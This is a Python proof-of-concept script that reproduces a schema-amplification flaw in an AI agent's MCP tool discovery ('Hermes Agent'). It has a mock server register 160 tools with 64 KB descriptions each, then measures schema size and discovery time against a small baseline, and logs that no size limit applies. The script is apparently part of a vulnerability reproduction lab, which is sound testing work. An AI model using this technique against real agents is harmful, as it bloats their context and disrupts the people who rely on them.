import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path


def find_lab_root():
    current = Path(__file__).resolve()
    for candidate in (current.parent, *current.parents):
        if (candidate / ".venv" / "Scripts" / "python.exe").exists() and (candidate / "scripts").is_dir():
            return candidate
    return current.parents[1]


ROOT = find_lab_root()
VENV = ROOT / ".venv"
LOGS = ROOT / "reports" / "logs"
HOME = ROOT / "home_mcp"


BASELINE_TOOLS = 4
BASELINE_DESC_KB = 1
ATTACK_TOOLS = int(os.environ.get("MCP_DISCOVERY_TOOL_COUNT", "160"))
ATTACK_DESC_KB = int(os.environ.get("MCP_DISCOVERY_DESC_KB", "64"))


def ts():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def py():
    return str(VENV / "Scripts" / "python.exe")


def case_env(tool_count, desc_kb, metrics_file):
    env = os.environ.copy()
    env.update(
        {
            "HERMES_HOME": str(HOME),
            "MCP_RESULT_MB": "1",
            "MCP_SCHEMA_TOOL_COUNT": str(tool_count),
            "MCP_SCHEMA_DESC_KB": str(desc_kb),
            "MCP_METRICS_FILE": str(metrics_file),
            "PYTHONIOENCODING": "utf-8",
            "NO_PROXY": "127.0.0.1,localhost",
        }
    )
    return env


def run_child(label, tool_count, desc_kb):
    metrics_file = LOGS / f"mcp_discovery_{label}.jsonl"
    if metrics_file.exists():
        metrics_file.unlink()
    cmd = [
        py(),
        str(Path(__file__).resolve()),
        "--child",
        label,
        str(tool_count),
        str(desc_kb),
        str(metrics_file),
    ]
    proc = subprocess.run(
        cmd,
        cwd=str(ROOT),
        env=case_env(tool_count, desc_kb, metrics_file),
        text=True,
        capture_output=True,
        timeout=180,
    )
    if proc.returncode != 0:
        print(proc.stdout, end="")
        print(proc.stderr, end="")
        raise SystemExit(proc.returncode)
    return json.loads(proc.stdout)


def run_case(label, tool_count, desc_kb, metrics_file):
    from tools.mcp_tool import register_mcp_servers, shutdown_mcp_servers
    from tools.registry import registry

    server_script = ROOT / "scripts" / "mock_mcp_amplify_server.py"
    config = {
        "amplify": {
            "command": py(),
            "args": [str(server_script)],
            "enabled": True,
            "timeout": 120,
            "connect_timeout": 30,
            "tools": {"resources": True, "prompts": False},
            "env": {
                "MCP_RESULT_MB": "1",
                "MCP_SCHEMA_TOOL_COUNT": str(tool_count),
                "MCP_SCHEMA_DESC_KB": str(desc_kb),
                "MCP_METRICS_FILE": str(metrics_file),
                "PYTHONIOENCODING": "utf-8",
            },
        }
    }

    started = time.perf_counter()
    try:
        registered = register_mcp_servers(config)
        elapsed_ms = int((time.perf_counter() - started) * 1000)
        schemas = registry.get_definitions(set(registered), quiet=True)
        schema_bytes = len(json.dumps(schemas, ensure_ascii=False).encode("utf-8"))
        desc_bytes = tool_count * desc_kb * 1024
        return {
            "label": label,
            "requested_schema_tools": tool_count,
            "requested_desc_kb": desc_kb,
            "registered_tools": len(registered),
            "tool_schema_bytes": schema_bytes,
            "attacker_description_bytes": desc_bytes,
            "discovery_ms": elapsed_ms,
            "result": "ACCEPTED_WITHOUT_SIZE_REJECTION",
        }
    finally:
        try:
            shutdown_mcp_servers()
        except Exception:
            pass


def parent():
    LOGS.mkdir(parents=True, exist_ok=True)
    HOME.mkdir(parents=True, exist_ok=True)
    print("Hermes Agent MCP discovery/schema amplification reproduction", flush=True)
    print(f"[{ts()}] lab_root={ROOT}", flush=True)
    print(f"[{ts()}] baseline_start schema_tools={BASELINE_TOOLS} schema_desc_kb={BASELINE_DESC_KB}", flush=True)
    baseline = run_child("baseline", BASELINE_TOOLS, BASELINE_DESC_KB)
    print(
        f"[{ts()}] baseline registered={baseline['registered_tools']} "
        f"schema_bytes={baseline['tool_schema_bytes']} discovery_ms={baseline['discovery_ms']}",
        flush=True,
    )
    print(f"[{ts()}] attack_start schema_tools={ATTACK_TOOLS} schema_desc_kb={ATTACK_DESC_KB}", flush=True)
    attack = run_child("attack", ATTACK_TOOLS, ATTACK_DESC_KB)
    amp = round(attack["tool_schema_bytes"] / max(1, baseline["tool_schema_bytes"]), 2)
    print(
        f"[{ts()}] attack registered={attack['registered_tools']} "
        f"schema_bytes={attack['tool_schema_bytes']} discovery_ms={attack['discovery_ms']} "
        f"schema_amplification={amp}x",
        flush=True,
    )
    print(
        f"[{ts()}] missing_bound no_tool_count_limit no_schema_byte_limit "
        f"accepted_description_bytes={attack['attacker_description_bytes']}",
        flush=True,
    )
    print(f"[{ts()}] RESULT=REPRODUCED_DISCOVERY_SCHEMA_AMPLIFICATION", flush=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--child", nargs=4, metavar=("LABEL", "TOOLS", "DESC_KB", "METRICS"))
    args = parser.parse_args()
    if args.child:
        label, tools, desc_kb, metrics = args.child
        result = run_case(label, int(tools), int(desc_kb), Path(metrics))
        print(json.dumps(result, ensure_ascii=False))
        return
    parent()


if __name__ == "__main__":
    main()
